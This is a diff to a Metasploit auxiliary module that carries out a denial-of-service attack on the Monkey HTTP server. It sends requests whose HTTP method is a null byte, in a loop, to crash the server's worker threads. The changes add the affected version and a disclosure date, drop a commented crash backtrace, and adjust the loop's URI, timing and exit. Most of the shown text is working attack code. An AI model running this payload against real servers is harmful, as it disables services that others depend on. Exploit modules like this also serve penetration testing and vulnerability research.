@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %q{
 				Sending a request containing null bytes causes a
 			thread to crash.  If you crash all of the threads,
-			the server becomes useless.
+			the server becomes useless.  Affects version 1.1.1.
 			},
 			'Author'         =>
 				[
@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					['URL' => 'http://monkey-project.com'],
 				],
-			'DisclosureDate' => ''))
+			'DisclosureDate' => 'May 25, 2013'))
 
 		register_options(
 			[
@@ -55,21 +55,6 @@ class Metasploit3 < Msf::Auxiliary
 		return res
 	end
 
-	# [2013/05/24 17:35:34] [   Info] HTTP Server started
-
-	# Program received signal SIGSEGV, Segmentation fault.
-	# [Switching to Thread 0xb6de1b40 (LWP 30602)]
-	# 0xb7e7b8a1 in ?? () from /lib/i386-linux-gnu/libc.so.6
-	# (gdb) bt
-	# #0  0xb7e7b8a1 in ?? () from /lib/i386-linux-gnu/libc.so.6
-	# #1  0x08050314 in mk_string_char_search_r ()
-	# #2  0x0804b8c2 in mk_handler_write ()
-	# #3  0x08050c00 in mk_conn_write ()
-	# #4  0x0804f54a in mk_epoll_init ()
-	# #5  0x0804ff07 in mk_sched_launch_worker_loop ()
-	# #6  0xb7f9fd78 in start_thread ()
-	#    from /lib/i386-linux-gnu/libpthread.so.0
-	# #7  0xb7ed63de in clone () from /lib/i386-linux-gnu/libc.so.6
 	def run
 		loop do
 			begin
@@ -81,11 +66,13 @@ class Metasploit3 < Msf::Auxiliary
 
 				res = send_request_raw({
 					'method' => "\x00",
-					'uri' => ""
+					'uri' => "/"
 				}, timeout = 1)
+				sleep 1
 				disconnect
 			rescue ::Rex::ConnectionRefused
 				print_status("Unable to connect to #{rhost}:#{rport}.")
+				break
 			rescue ::Errno::ECONNRESET
 				print_status("DoS packet successful. #{rhost} not responding.")
 			rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
